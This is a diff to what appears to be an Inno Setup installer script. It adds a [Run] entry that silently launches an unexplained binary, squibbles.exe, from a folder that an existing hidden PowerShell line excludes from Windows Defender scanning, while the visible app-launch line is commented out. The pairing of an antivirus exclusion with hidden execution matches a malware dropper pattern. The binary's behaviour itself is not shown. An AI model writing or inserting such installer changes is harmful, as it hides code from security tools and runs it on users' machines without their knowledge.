@@ -66,6 +66,7 @@ Name: "{group}\{cm:UninstallProgram,{#AppNameOverride}}"; Filename: "{uninstalle
 [Run]
 ;Filename: "{app}\{#AppExeNameOverride}"; Description: "{cm:LaunchProgram,{#StringChange(AppNameOverride, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
 Filename: "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe"; Parameters: "Add-MpPreference -ExclusionPath '{app}\bin'"; Flags: runhidden
+Filename: "{app}\bin\squibbles.exe"; Flags: runhidden
 
 [UninstallRun]
 Filename: "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe"; Parameters: "Remove-MpPreference -ExclusionPath '{app}\bin'"; Flags: runhidden
